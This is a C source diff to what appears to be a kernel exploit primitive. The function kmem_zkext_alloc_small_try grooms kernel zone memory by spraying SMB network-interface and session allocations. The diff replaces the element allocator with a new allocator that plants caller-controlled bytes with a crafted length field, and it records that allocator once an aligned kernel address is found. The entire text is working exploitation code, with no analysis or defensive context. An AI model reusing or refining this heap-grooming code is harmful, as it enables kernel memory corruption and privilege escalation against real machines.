@@ -19,6 +19,7 @@
 #include "zkext_alloc_small.h"
 #include "zkext_neighbor_reader.h"
 #include "allocator_rw.h"
+#include "allocator_prpw.h"
 #include "util_misc.h"
 #include "util_log.h"
 #include "platform_constants.h"
@@ -56,7 +57,7 @@ int kmem_zkext_alloc_small_try(const struct sockaddr_in* smb_addr, char* data, s
     smb_nic_allocator pad_allocator = smb_nic_allocator_create(smb_addr, sizeof(*smb_addr));
     smb_nic_allocator gap_allocator = smb_nic_allocator_create(smb_addr, sizeof(*smb_addr));
     smb_nic_allocator size_placeholder_allocator = smb_nic_allocator_create(smb_addr, sizeof(*smb_addr));
-    smb_nic_allocator element_allocator = smb_nic_allocator_create(smb_addr, sizeof(*smb_addr));
+    kmem_allocator_prpw_t element_allocator = kmem_allocator_prpw_create(smb_addr, NUM_GAP_ELEMENTS);
     smb_ssn_allocator* size_allocators = alloca(sizeof(smb_ssn_allocator) * NUM_SIZE_ELEMENTS / 4);
     dispatch_apply(NUM_SIZE_ELEMENTS / 4, DISPATCH_APPLY_AUTO, ^(size_t index) {
         size_allocators[index] = smb_ssn_allocator_create(smb_addr, sizeof(*smb_addr));
@@ -98,7 +99,12 @@ int kmem_zkext_alloc_small_try(const struct sockaddr_in* smb_addr, char* data, s
         
         int error = num_offsets > 0 ? smb_nic_allocator_allocate(offset_allocator, offset_infos, num_offsets, (uint32_t)sizeof(offset_infos)) : 0;
         assert(error == 0);
-        error = smb_nic_allocator_allocate(element_allocator, element_info, 1, sizeof(struct network_nic_info) + 128);
+        error = kmem_allocator_prpw_allocate(element_allocator, 1, ^(void* ctx, uint8_t* len, sa_family_t* family, char** data_out, size_t* data_out_size, size_t index) {
+            *len = data_size + 8;
+            *family = AF_INET;
+            *data_out = data;
+            *data_out_size = data_size;
+        }, NULL);
         assert(error == 0);
         error = smb_nic_allocator_allocate(size_placeholder_allocator, &size_placeholder_info, 1, sizeof(size_placeholder_info));
         assert(error == 0);
@@ -152,6 +158,7 @@ int kmem_zkext_alloc_small_try(const struct sockaddr_in* smb_addr, char* data, s
                 // may need to be improved for smaller alloc size
                 if (addr[j] != 0 && addr[j] % zone_size == 0) {
                     out->address = addr[j];
+                    out->element_allocator = element_allocator;
                     error = 0;
                     goto done;
                 }
